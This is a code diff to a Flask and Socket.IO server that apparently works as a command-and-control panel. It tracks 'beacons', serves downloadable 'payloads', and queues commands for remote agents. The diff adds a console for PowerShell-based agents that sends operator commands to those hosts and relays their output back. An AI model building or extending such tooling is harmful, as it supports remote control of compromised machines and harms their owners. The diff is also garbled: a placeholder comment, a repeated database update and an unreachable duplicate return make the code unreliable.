@@ -372,11 +372,33 @@ def result():
     conn.commit()
     conn.close()
 
-    socketio.emit("console_result", {
-        "hostname": hostname,
-        "command": command,
-        "result": result
-    })
+    # ... existing code above ...
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute(
+        "UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'",
+        (result, hostname, command)
+    )
+    conn.commit()
+    conn.close()
+
+    # Identify PS agents
+    is_ps_agent = str(hostname).lower().startswith("ps_") or (data.get("payload") or "").startswith("ps_")
+
+    if is_ps_agent:
+        socketio.emit("ps_output", {
+            "hostname": hostname,
+            "output": result
+        })
+    else:
+        socketio.emit("console_result", {
+            "hostname": hostname,
+            "command": command,
+            "result": result
+        })
+
+    return jsonify({"status": "result stored"})
+
 
     return jsonify({"status": "result stored"})
 
@@ -616,6 +638,41 @@ def payloads_download(filename):
         print("[!] Directory contents:", os.listdir(payload_dir))
 
     return send_from_directory(payload_dir, filename, as_attachment=True)
+
+@app.route('/console_ps')
+@login_required
+def console_ps():
+    return render_template('console_ps.html')
+
+@app.route('/console_ps_data')
+@login_required
+def console_ps_data():
+    # Return list of only PowerShell-based agents
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT DISTINCT hostname FROM beacons WHERE payload LIKE 'ps_%'")
+    hosts = [row[0] for row in c.fetchall()]
+    conn.close()
+    return jsonify({'hosts': hosts})
+
+
+
+# SOCKETIO HANDLERS
+@socketio.on('ps_command')
+def handle_ps_command(data):
+    hostname = data.get('hostname')
+    command = data.get('command')
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT INTO tasks (hostname, command, status) VALUES (?, ?, 'pending')", (hostname, command))
+    conn.commit()
+    conn.close()
+
+def emit_ps_result(hostname, output):
+    socketio.emit('ps_output', {
+        'hostname': hostname,
+        'output': output
+    })
 
 
 @socketio.on('connect')
